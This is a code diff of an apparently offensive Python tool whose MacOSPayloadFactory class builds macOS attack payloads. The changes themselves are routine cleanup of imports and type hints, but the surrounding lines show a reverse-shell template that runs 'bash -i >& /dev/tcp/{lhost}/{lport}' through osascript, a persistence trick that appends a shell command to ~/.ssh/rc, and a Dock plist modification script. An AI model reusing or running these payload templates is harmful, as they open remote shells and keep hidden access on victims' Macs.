@@ -11,12 +11,10 @@ from __future__ import annotations
 import base64
 import os
 import plistlib
-import shutil
 import subprocess
-import tempfile
-from dataclasses import dataclass, field
+from dataclasses import dataclass
 from pathlib import Path
-from typing import Any, Optional
+from typing import Any
 
 SESSIONS_DIR = Path(__file__).resolve().parent.parent / "sessions"
 
@@ -114,7 +112,7 @@ class MacOSPayloadFactory:
         'osascript -e \'do shell script "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"\''
     )
 
-    def __init__(self, config: Optional[MacOSPayloadConfig] = None, output_dir: Optional[Path] = None):
+    def __init__(self, config: MacOSPayloadConfig | None = None, output_dir: Path | None = None):
         self.config = config or MacOSPayloadConfig()
         self.output_dir = Path(output_dir) if output_dir else SESSIONS_DIR / "payloads" / "macos"
         self.output_dir.mkdir(parents=True, exist_ok=True)
@@ -442,7 +440,7 @@ echo '{shell_cmd} &>/dev/null &' >> ~/.ssh/rc 2>/dev/null
 chmod +x ~/.ssh/rc 2>/dev/null
 '''
 
-        scripts["dock_plist"] = f'''\
+        scripts["dock_plist"] = '''\
 #!/bin/bash
 defaults write com.apple.dock persistent-apps -array-add \\
     "<dict><key>tile-data</key><dict><key>file-data</key><dict>\\
